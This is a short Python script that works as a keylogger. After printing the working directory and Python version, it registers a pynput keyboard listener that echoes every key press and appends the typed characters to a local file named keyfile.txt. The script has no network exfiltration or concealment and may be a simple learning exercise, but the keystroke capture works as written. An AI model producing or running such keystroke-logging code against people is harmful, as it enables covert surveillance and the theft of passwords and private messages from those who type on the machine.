import os
print(os.getcwd(),end='\n')

import sys
print(sys.version,'\n')

# Set the working directory to the script's directory
script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)
print(os.getcwd(),end='\n')
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt",'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()